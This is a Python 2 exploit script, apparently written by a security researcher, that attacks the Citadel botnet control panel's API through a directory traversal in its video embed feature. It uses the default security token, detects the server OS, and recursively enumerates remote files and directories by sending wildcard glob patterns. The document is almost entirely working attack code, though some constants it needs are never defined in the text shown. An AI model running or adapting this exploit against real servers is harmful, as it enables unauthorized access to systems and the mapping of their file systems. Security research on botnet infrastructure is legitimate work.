#!/usr/bin/python

__version__ = '1.1'
__author__ = 'Rotem Kerner'

import re
import os
import sys
import getopt
import httplib2
import datetime

from urllib import quote_plus
from collections import OrderedDict


def is_citadel_api(api_url, force_api):
	"""
	
	Receives an HTTP URL and returns a True/False estimation whether this URL is a Citadel API

	api_url -- URL of the API service
	
	"""
	
	if force_api == 1:
		return True
	
	response_body = ''
	result_error = -1
	result_smiley = -1
	
	try:
		client = httplib2.Http()
		response_body = client.request(api_url)[1]
		
		result_smiley = response_body.find(':)')
		result_error = response_body.find('ERROR: Invalid security token')
		
	except BaseException as e:
		print '[X] %s' % (e.message)
	
	if result_smiley > -1:
		return True
		
	if result_error > -1:
		return True
	
	return False
		
####################################################################################

# /cita/api.php/changethispassword/video/embed?botId=../../../api.php&video=&botnet=&

class Exploit(object):
	"""
	
	Citadel API video embed feature - directory traversal exploit
	This class exposes several methods to ease the exploitation of this vulnerability
	
	api_url -- an HTTP URL of the citadel API
	token -- a token to be used by the exploit (default 'changethispassword')
	
	"""
	
	def __init__(self, api_url, host, ticket_id, token = 'changethispassword'):
		
		# set api url
		self.api_url = api_url
		
		# set token
		self.api_token = token
		
		self.server_os_type = None
		
		# try to query
		client = httplib2.Http()
		response = client.request('%s/%s/video/embed?botId=&video=&botnet=&' % (self.api_url, self.api_token))
		response_body = response[1]
		
		# set data to emit
		pattern = re.compile( r'.*src="(.*?)"')
		matched = pattern.match(response_body)
		
		if matched:
			self.emit_data = matched.group(1)
		
		elif response_body.find('Invalid security token') != -1:
			raise BaseException, 'The security token is invalid.'
		
		else:
			raise BaseException, 'Received an unknown response from the server: \n\n%s' % (response_body)
			
		# detect os
		self.server_os_type = self.detect_os()
		
	####################################################################################

	def query(self, query_path):
		"""
		
		Receives a query string and returns the extracted results or False on failure or empty results
		
		query_path -- the query string
		
		"""
		
		response = ''
		client = httplib2.Http()
		
		try:
			if self.server_os_type == NIX_ARCH:
				query = '%s/%s/video/embed?botId=%s&video=&botnet=&' % (self.api_url, self.api_token, query_path)
			
			elif self.server_os_type == WIN_ARCH:
				query = '%s/%s/video/embed?botId=&video=%s&botnet=&' % (self.api_url, self.api_token, query_path)
			
			else:
				query = '%s/%s/video/embed?botId=%s&video=&botnet=&' % (self.api_url, self.api_token, query_path)
			
			response = client.request(query)
			
		except BaseException as e:
			print '[X] %s' % (e.message)
			
		if response:
			response_body = response[1]
			pattern = re.compile( r'.*src="(.*?)"')
			matched = pattern.match(response_body)
			
			if matched:
				data = matched.group(1)
				index = stricmp(data, self.emit_data)
				
				if self.server_os_type == WIN_ARCH:
					index -= 1
					
				return data[index:]
				
		return False
		
	####################################################################################
	
	def get_recursive_dir_map(self, path, tree={}, recursive_lvl=-1):
		"""
		
		Recursive version of get_dir_map() which maps all the files and directories in a specific path recursively
		
		path -- the path to be recursively traversed
		tree -- a dictionary to contain all results ( default Dict() )
		recursive_lvl -- the required level of recursion
		
		"""
		
		file_list = self.get_dir_map(path)
		tree[path] = file_list
		
		for filename in file_list:
			if filename[-1] == '/':
				if recursive_lvl != 0:
					self.get_recursive_dir_map(path + filename, tree, recursive_lvl - 1)
					
		return tree
		
	####################################################################################
	
	def get_dir_map(self, dir_path):
		"""
		
		Receives a path to be mapped and returns a dictionary with the names of the files/folders
		
		dir_path -- relative path to a directory
		
		"""
		
		# find all words in 4 letter size example:
		# ???? -> abcd
		# ???[!d] -> false
		# ??[!c]? -> abdd
		# ??[!cd]? -> false
		# ?[!b]?? -> false
		# [!a]??? -> xabc
		# [!ax]??? -> false ----> end of loop for that size
		
		words = {}
		dir_length = len(dir_path) + 1
		
		# init the word list
		# example: {'1': ['a','b','c', ...] , '2' : ['ab','cd', ...] ...}
		
		# initialize data structure
		# TODO: use a better word range recognition mechanism
		
		for i in range(1, FILE_MAX_SIZE):
			word_exists = self.query(dir_path + "?" * i)
			
			if word_exists:
				if self.server_os_type is WIN_ARCH and self.query(word_exists + '/'):
					word_exists += "/"
				words[i] = [word_exists[dir_length:], ]
				
		for word_len in words:
			char_cycle_order = range(word_len)
			char_cycle_order.reverse()
			
			for char_pos in char_cycle_order:
				
				# initialize payload
				payload = ['?'] * word_len
				
				while True:
					
					# generate NOT chars list
					not_chars = [x[char_pos] for x in words[word_len]]
					
					# construct inside the payload
					payload[char_pos] = '[!' +  quote_plus(escape(''.join(not_chars))) + ']'
					
					# attack!
					word = self.query(dir_path + ''.join(payload))
					
					# if the answer from the server is false then - next char position
					if not word:
						break
						
					if self.server_os_type is WIN_ARCH and self.query(word + '/'):
						word += '/'
						
					# if its a new word insert into the list
					if word not in words[word_len]:
						words[word_len].append(word[dir_length:])
								
		file_list = []
		[file_list.extend(words[n]) for n in words]
		
		return file_list
	
	####################################################################################
	
	def detect_os(self):
		"""
		
		Detect whether the server we are talking to is Windows/Linux based

		"""
		
		if not self.query('\\\\'):
			return NIX_ARCH
		
		return WIN_ARCH
		
####################################################################################

def escape(string, escape_list = ('+', '-', '?', '\\', '*', '|')):
	
	l = list(string)
	
	for i in range(len(l)):
		if l[i] in escape_list:
			l[i] = "\\" + l[i]
			
	return ''.join(l)
	
####################################################################################

def stricmp(str, str2):
	
	smaller_str = min(str, str2, key=len)
	smaller_str_len = len(smaller_str)
	
	for i in range(smaller_str_len):
		if str[i] != str2[i]:
			return i
	
	return smaller_str_len
